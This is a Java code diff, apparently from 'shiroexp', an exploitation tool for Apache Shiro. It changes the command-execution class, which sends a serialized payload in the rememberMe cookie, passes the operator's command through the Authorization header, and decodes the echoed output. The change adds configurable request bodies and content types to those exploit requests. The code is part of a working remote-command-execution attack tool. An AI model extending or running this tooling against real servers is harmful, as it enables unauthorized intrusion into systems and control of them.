@@ -6,12 +6,32 @@ import com.y5neko.shiroexp.object.ResponseOBJ;
 import com.y5neko.shiroexp.object.TargetOBJ;
 import com.y5neko.shiroexp.request.HttpRequest;
 
+import okhttp3.FormBody;
+import okhttp3.RequestBody;
+
 import java.lang.reflect.Method;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
 public class CommandExcute {
+
+    /**
+     * 根据 Content-Type 和请求体创建 RequestBody
+     * @param contentType Content-Type
+     * @param requestBody 请求体内容
+     * @return RequestBody 对象
+     */
+    private static RequestBody createRequestBody(String contentType, String requestBody) {
+        if (requestBody != null && !requestBody.isEmpty()) {
+            // 用户提供了请求体，使用指定的 Content-Type
+            String mediaType = contentType != null ? contentType : "text/plain";
+            return RequestBody.create(okhttp3.MediaType.parse(mediaType), requestBody);
+        } else {
+            // 没有请求体，使用空的 FormBody（默认 application/x-www-form-urlencoded）
+            return new FormBody.Builder().build();
+        }
+    }
     /**
      * 命令执行回显（返回结果）
      * @param targetOBJ 请求对象
@@ -31,7 +51,10 @@ public class CommandExcute {
             headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
             headers.put("Authorization", "Basic " + command);
 
-            ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, null, headers, targetOBJ.getRequestType());
+            // 创建请求体（根据用户配置）
+            RequestBody httpRequestBody = createRequestBody(targetOBJ.getContentType(), targetOBJ.getRequestBody());
+
+            ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, httpRequestBody, headers, targetOBJ.getRequestType());
 
             // 解码响应（优先使用UTF-8）
             byte[] responseBytes = Base64.getDecoder().decode(Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse())));
@@ -65,7 +88,10 @@ public class CommandExcute {
             headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
             headers.put("Authorization", "Basic " + command);
 
-            ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, null, headers, targetOBJ.getRequestType());
+            // 创建请求体（根据用户配置）
+            RequestBody httpRequestBody = createRequestBody(targetOBJ.getContentType(), targetOBJ.getRequestBody());
+
+            ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, httpRequestBody, headers, targetOBJ.getRequestType());
 
             // 解码响应（优先使用UTF-8）
             byte[] responseBytes = Base64.getDecoder().decode(Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse())));
